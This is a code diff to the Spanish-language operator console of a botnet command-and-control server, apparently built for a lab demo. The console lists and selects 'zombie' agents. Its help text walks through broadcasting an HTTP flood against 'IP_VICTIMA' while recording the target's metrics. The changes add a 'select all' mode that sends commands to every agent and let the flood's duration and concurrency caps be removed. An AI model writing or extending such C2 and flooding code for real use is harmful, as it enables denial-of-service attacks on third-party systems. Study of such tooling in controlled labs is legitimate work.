@@ -84,7 +84,7 @@ def _as_int(value, default: int) -> int:
         return default
 
 
-def _positive_int(value, default: int, maximum: int, field: str) -> int:
+def _positive_int(value, default: int, maximum: int | None, field: str) -> int:
     if value is None or value == "":
         return default
     if isinstance(value, bool):
@@ -95,7 +95,20 @@ def _positive_int(value, default: int, maximum: int, field: str) -> int:
         raise ValueError(f"{field} invalido: debe ser un entero mayor que 0") from None
     if number <= 0:
         raise ValueError(f"{field} invalido: debe ser un entero mayor que 0")
-    return min(number, maximum)
+    if maximum is not None:
+        return min(number, maximum)
+    return number
+
+
+def _load_cap(configured: int | None, default: int) -> int | None:
+    """Tope efectivo del comando load.
+
+    `None` (no configurado) usa el tope por defecto del codigo; `0` quita
+    el tope; un valor positivo lo reemplaza.
+    """
+    if configured is None:
+        return default
+    return configured if configured > 0 else None
 
 
 def _redact_url(url: str) -> str:
@@ -148,8 +161,18 @@ def normalize_load_args(args: dict, config: Config) -> dict:
         raise ValueError("falta target=http://host[:puerto][/ruta]")
     return {
         "target": _normalize_target(args.get("target"), config),
-        "duration": _positive_int(args.get("duration"), 30, MAX_DURATION_S, "duration"),
-        "concurrency": _positive_int(args.get("concurrency"), 20, MAX_CONCURRENCY, "concurrency"),
+        "duration": _positive_int(
+            args.get("duration"),
+            30,
+            _load_cap(config.flood_max_duration, MAX_DURATION_S),
+            "duration",
+        ),
+        "concurrency": _positive_int(
+            args.get("concurrency"),
+            20,
+            _load_cap(config.flood_max_concurrency, MAX_CONCURRENCY),
+            "concurrency",
+        ),
     }
 
 
@@ -190,7 +213,7 @@ def completion_options(buffer: str, agent_refs: list[str], text: str = "") -> li
         head = parts[0]
         if head in ("select", "ping", "kick"):
             options = list(agent_refs)
-            if head == "ping":
+            if head in ("select", "ping"):
                 options.append("all")
         elif head in ("send", "broadcast"):
             if len(parts) == 1:
@@ -561,6 +584,7 @@ class Console:
         self.config = config
         self.after_delay = after_delay
         self.selected: AgentConnection | None = None
+        self.all_selected = False
         self._reader: _StdinReader | None = None
 
     def event(self, text: str) -> None:
@@ -614,6 +638,7 @@ class Console:
             self._cmd_select(rest)
         elif command in ("unselect", "deselect"):
             self.selected = None
+            self.all_selected = False
             print("(sin agente seleccionado)")
         elif command == "send":
             await self._cmd_send(rest)
@@ -643,30 +668,20 @@ class Console:
         print("=" * 66)
 
     def _print_help(self) -> None:
-        print(" comandos disponibles (Tab autocompleta):")
-        print("   list                      lista los agentes conectados")
-        print("   select <#|id>             selecciona un agente (ej: select 0)")
-        print("   unselect                  quita la seleccion")
-        print("   send <cmd> [clave=valor]  envia un comando al agente seleccionado (ej: send info)")
-        print("   broadcast <cmd> [k=v ...] envia un comando a todos los agentes")
-        print("   ping <#|id|all>           prueba de vida (ej: ping all)")
-        print("   kick <#|id>               cierra la conexion de un agente (ej: kick 0)")
-        print("   metrics [etiqueta]        registra metricas del objetivo (API Netdata)")
-        print("   status                    estado del servidor")
-        print("   clear                     limpia la pantalla")
-        print("   exit                      apaga el servidor")
-        print("   Ctrl+B  D                 salir de la consola sin apagar el C2 (detach de tmux)")
-        print("   Ctrl+C                    borra la linea actual (no apaga el servidor)")
-        print("   Ctrl+D                    en linea vacia, apaga el servidor")
-        print(" ejemplo rapido de una sesion:")
-        print("   list                                     # ver los zombies conectados")
-        print("   select 0                                 # elegir el zombie #0")
-        print("   ping all                                 # prueba de vida de todos")
-        print("   send info                                # datos del equipo del zombie")
-        print("   broadcast load target=http://IP_VICTIMA duration=30 concurrency=20")
-        print("                                            # inundacion de 30 s contra la victima")
-        print("   metrics durante                          # guardar metricas en data/metricas.jsonl")
-        print("   kick 1                                   # expulsar al zombie #1")
+        print(" comandos (Tab autocompleta):")
+        print("   list | select <#|id|all> | send <cmd> [k=v] | broadcast <cmd> [k=v]")
+        print("   ping <#|id|all> | kick <#|id> | metrics [etiqueta] | status | clear | exit")
+        print(" paso a paso de la demo:")
+        print("   1) list                  ver los zombies conectados")
+        print("   2) select 1              elegir un zombie (marca * en la tabla)")
+        print("   3) send info             datos del equipo del zombie")
+        print("   4) select all            volver a apuntar a TODOS (marca > en la tabla)")
+        print("   5) ping all              prueba de vida de todos")
+        print("   6) broadcast load target=http://IP_VICTIMA duration=30 concurrency=50")
+        print("                            inundacion contra la victima (Netdata a la vista)")
+        print("   7) metrics manual        guardar cpu/ram/red en data/metricas.jsonl")
+        print("   8) kick 1 | send stop    expulsar / detener un agente")
+        print(" notas: Ctrl+B D = salir sin apagar (tmux) | Ctrl+C = borrar linea | exit = apagar")
 
     def _print_agents(self) -> None:
         agents = self.manager.agents
@@ -678,7 +693,12 @@ class Console:
             f"{'SO':<18}{'DIRECCION':<22}{'CONECTADO':>10}{'IDLE':>7}"
         )
         for index, agent in enumerate(agents):
-            marker = "*" if agent is self.selected else " "
+            if self.all_selected:
+                marker = ">"
+            elif agent is self.selected:
+                marker = "*"
+            else:
+                marker = " "
             print(
                 f"{marker:<2}{index:>2}  "
                 f"{_fit(agent.agent_id, 16):<16}"
@@ -692,18 +712,27 @@ class Console:
 
     def _cmd_select(self, rest: list[str]) -> None:
         if not rest:
-            print("uso: select <#|id>")
+            print("uso: select <#|id|all>")
+            return
+        if rest[0].lower() in ("all", "todos", "*"):
+            self.selected = None
+            self.all_selected = True
+            print("(todos los agentes: 'send' y 'ping' se enviaran a todos)")
             return
         agent = self.manager.find(rest[0])
         if agent is None:
             print(f"no se encontro un agente: {rest[0]}")
             return
         self.selected = agent
+        self.all_selected = False
         print(f"agente seleccionado: {agent.agent_id} ({agent.hostname or 'sin nombre'})")
 
     async def _cmd_send(self, rest: list[str]) -> None:
+        if self.all_selected:
+            await self._cmd_broadcast(rest)
+            return
         if self.selected is None:
-            print("primero seleccione un agente con 'select <#|id>'")
+            print("primero seleccione un agente con 'select <#|id|all>'")
             return
         if not rest:
             print("uso: send <cmd> [clave=valor ...]")
@@ -814,6 +843,9 @@ class Console:
             if agent is None:
                 print(f"no se encontro un agente: {rest[0]}")
                 return
+        elif self.all_selected:
+            await self._cmd_broadcast(["ping"])
+            return
         else:
             agent = self.selected
         if agent is None:
